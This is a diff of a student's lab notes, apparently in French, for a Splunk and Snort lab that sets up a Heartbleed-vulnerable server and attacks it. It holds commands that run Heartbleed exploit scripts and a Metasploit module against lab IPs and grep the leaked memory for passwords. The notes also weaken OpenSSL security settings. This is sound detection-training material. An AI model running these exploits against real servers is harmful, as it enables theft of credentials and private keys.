@@ -1,11 +1,13 @@
 ## splunk server start
 
 sudo /home/etudiant/splunk/bin/splunk restart 
+sudo /home/etudiant/splunk/bin/splunk start 
 
 
 ## splunk UF start : FW
 
 sudo /opt/splunkforwarder/bin/splunk restart 
+sudo /opt/splunkforwarder/bin/splunk stop 
 
 
 <<< vitrygtr
@@ -65,53 +67,53 @@ http://splunk:8000/fr-FR/app/SplunkforSnort/report?s=%2FservicesNS%2Fnobody%2FSp
 http://splunk:8000/fr-FR/app/DNS_Insight/overview?earliest=-30m&latest=now&form.src=*&form.dest=*
 
 ## launching snort
-sudo /usr/sbin/snort -A console -i enp0s3 -u snort -c /etc/snort/snort.conf -A full  
-
+<!-- sudo /usr/sbin/snort -A console -i enp0s3 -u snort -c /etc/snort/snort.conf -A full   -->
+sudo /usr/sbin/snort -A fast -i enp0s3 -u snort -c /etc/snort/snort.conf 
 
 ## launching exploit
-
+à la fois relativement petit et grand
 
 
 ## heartbleed exploit
 
-# if manually installed
-##### on all server
-sudo apt-get update -y && sudo apt-get install -y git && git clone https://github.com/amineAUPEC/heartbleed-automation.git && cd heartbleed-automation/
-
 ##### vulnerable server part :
+<!-- sudo /home/etudiant/heartbleed-automation/bash/heartbleed-vulnerable-server.sh -->
 
-
-
-sudo ./bash/heartbleed-vulnerable-server.sh
+cd /home/etudiant/heartbleed-automation/bash/heartbleed-example/
+sudo docker-compose up -d
 
 
 
 ##### injection server -- simulate client request
-
-
-cd /home/etudiant/heartbleed-example && python stimulate_server.py -a $ip 
+cd /home/etudiant/heartbleed-example 
+python stimulate_server.py -a 192.168.1.49
 
 
 
 ##### pentest server
-cd heartbleed-automation/ && sudo chmod +x ./bash/heartbleed-vulnerable-pentest.sh
-#### set IP
-nano ./conffiles/hostlist.txt && nano ./bash/heartbleed-vulnerable-pentest.sh
 # execute file
-sudo ./bash/heartbleed-vulnerable-pentest.sh
 cd /home/etudiant/heartbleed-example
-watch sudo python heartbleed.py 192.168.1.173 -p 443
+<!-- watch  -->
+<!-- sudo python heartbleed.py 192.168.1.49 -p 443 -n 1150 -->
+sudo python heartbleed.py 192.168.1.49 -p 443 -n 1150 > /home/etudiant/reject_exploit.log
+cat -n /home/etudiant/reject_exploit.log | grep assword | cat -n
 
 
 ################ + d'information décodée
-cd ./python/ && chmod +x exploit.python
-watch sudo python exploit.py 192.168.1.173 -p 443  
-10.10.3.155
+cd /home/etudiant/heartbleed-automation/python/
+
+sudo python exploit.py 192.168.1.49 -p 443 
 
 
-##### exploit via metasploit
-sudo apt-get update -y && sudo apt-get install -y git && git clone https://github.com/amineAUPEC/heartbleed-automation.git 
-cd /home/etudiant/heartbleed-automation/bash/msf/ && sudo chmod +x metasploit_heartbleed.sh && sudo ./metasploit_heartbleed.sh
+<!-- watch -n 1 sudo python exploit.py 192.168.1.49 -p 443  
+watch -n 1 sudo python /home/etudiant/heartbleed-automation/python/exploit.py 192.168.1.49 -p 443   -->
+
+
+
+
+
+##### pentest server -- exploit via metasploit
+sudo /home/etudiant/heartbleed-automation/bash/msf/metasploit_heartbleed.sh
 
 
 
@@ -140,6 +142,22 @@ sudo apt-get update -y && sudo apt-get install -y git python && git clone https:
 cd /home/etudiant && git clone https://github.com/injcristianrojas/heartbleed-example.git
 sudo sed -E -i 's/CipherString = DEFAULT@SECLEVEL=2/CipherString = DEFAULT@SECLEVEL=1/' /etc/ssl/openssl.cnf
 
+################ + d'information décodée
+cd /home/etudiant/heartbleed-automation/python/ && chmod +x exploit.python
+watch -n 1 sudo python exploit.py 192.168.1.173 -p 443  
+
+##### pentest server
+cd /home/etudiant/heartbleed-automation/ 
+
+
+
+#### set IP
+nano ./conffiles/hostlist.txt 
+<!-- && nano ./bash/heartbleed-vulnerable-pentest.sh -->
+## execute file
+<!-- sudo ./bash/heartbleed-vulnerable-pentest.sh -->
+
+
 ##### vulnerable server via BWAPP Docker container
 sudo hostnamectl set-hostname bwapp
 sudo chmod +x ./bash/install-docker.sh && sudo ./bash/install-docker.sh
@@ -161,9 +179,11 @@ watch /etc/apache2/ssl/apache.key
 watch 'cat /etc/apache2/ssl/apache.key; cat /etc/apache2/ssl/apache.crt'
 
 
+##### exploit via metasploit
 
+sudo apt-get update -y && sudo apt-get install -y git && git clone https://github.com/amineAUPEC/heartbleed-automation.git 
 
-
+cd /home/etudiant/heartbleed-automation/bash/msf/ && sudo chmod +x metasploit_heartbleed.sh
 ## LIST OF OPTIONS for COMMANDS SPLUNK
 
 earliest=-15m 
